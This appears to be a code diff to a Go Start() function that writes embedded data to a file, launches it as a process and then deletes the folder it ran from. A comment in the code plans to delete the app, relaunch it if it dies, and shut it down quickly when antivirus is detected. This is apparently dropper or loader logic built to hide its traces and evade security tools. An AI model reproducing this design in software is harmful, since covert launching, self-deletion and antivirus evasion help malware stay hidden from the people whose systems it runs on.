@@ -33,6 +33,7 @@ func Start() bool {
 		7. delete the app
 		8. Monitor if the app is working... if it died after launching, we should relaunch by repeating the entire process again!
 			monitor if there is an active antivirus...if yes, then shutdown fast the app!
+		9. The app should also die from sigterm...
 	*/
 
 	var fsData []byte
@@ -109,10 +110,15 @@ func Start() bool {
 	log.Println("writing data to file")
 	fileSize := len(fsData)
 	sizeWritten, _err := fs.Write(fsData)
-
 	if _err != nil {
 		log.Println("failed to write data to file -> ", _err.Error())
 		// TODO: handle this error!?...
+		fs.Close()
+		return false
+	}
+	_err = fs.Close()
+	if _err != nil {
+		log.Println("failed to close the file from writing... -> ", _err.Error())
 		return false
 	}
 
@@ -134,6 +140,13 @@ func Start() bool {
 		return false
 	}
 	log.Println("the app has started with pid -> ", command.Process.Pid)
+
+	// Let's delete the entire folder!?
+	_err = folder.Delete(dirPath)
+	if _err != nil {
+		log.Println("failed to delete dirPath -> ", dirPath, " -> ", _err.Error())
+		return false
+	}
 
 	return true
 }
